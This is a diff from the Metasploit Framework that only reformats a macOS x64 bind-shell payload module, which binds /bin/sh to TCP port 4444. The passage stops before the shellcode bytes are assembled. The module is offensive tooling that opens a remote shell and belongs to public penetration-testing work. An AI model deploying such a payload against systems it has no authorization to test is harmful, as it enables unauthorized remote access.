@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 136
 
   include Msf::Payload::Single
@@ -13,28 +11,32 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'OS X x64 Shell Bind TCP',
-      'Description'   => 'Bind an arbitrary command to an arbitrary port',
-      'Author'        => 'nemo <nemo[at]felinemenace.org>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'osx',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'OS X x64 Shell Bind TCP',
+        'Description' => 'Bind an arbitrary command to an arbitrary port',
+        'Author' => 'nemo <nemo[at]felinemenace.org>',
+        'License' => MSF_LICENSE,
+        'Platform' => 'osx',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShellUnix
+      )
+    )
 
     # exec payload options
     register_options(
       [
-        OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
+        OptString.new('CMD', [ true, "The command string to execute", "/bin/sh" ]),
         Opt::LPORT(4444)
-    ])
+      ]
+    )
   end
 
   # build the shellcode payload dynamically based on the user-provided CMD
   def generate
-    cmd  = (datastore['CMD'] || '') + "\x00"
+    cmd = (datastore['CMD'] || '') + "\x00"
     port = [datastore['LPORT'].to_i].pack('n')
     call = "\xe8" + [cmd.length].pack('V')
     payload =
